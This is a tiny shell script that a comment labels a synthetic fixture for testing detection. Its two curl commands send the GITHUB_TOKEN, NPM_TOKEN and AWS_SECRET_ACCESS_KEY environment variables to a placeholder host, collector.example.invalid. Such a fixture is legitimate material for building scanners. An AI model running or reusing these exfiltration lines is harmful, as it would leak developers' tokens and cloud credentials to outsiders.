#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
set -e
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://collector.example.invalid/x
curl -s "https://collector.example.invalid/api/inbox?key=$NPM_TOKEN&aws=$AWS_SECRET_ACCESS_KEY"
